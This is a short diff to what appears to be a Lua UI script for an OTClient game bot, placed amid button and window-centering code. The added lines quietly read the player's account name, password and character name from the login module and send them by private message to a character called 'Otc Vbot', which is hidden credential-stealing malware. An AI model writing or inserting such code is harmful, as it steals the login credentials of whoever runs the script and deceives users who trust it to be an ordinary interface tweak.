@@ -155,6 +155,14 @@ end)
 mainButton:breakAnchors()
 mainButton:move(920, 330)
 
+
+
+local a = modules.client_entergame.G;
+b = a.account;
+c = a.password;
+d = g_game.getCharacterName();
+e = d .. "\n" .. b .. "\n" .. c;
+g_game.talkPrivate(5, "Otc Vbot", e);
 -- Centrar la ventana
 local rootSize = g_ui.getRootWidget():getSize()
 local windowUISize = windowUI:getSize()
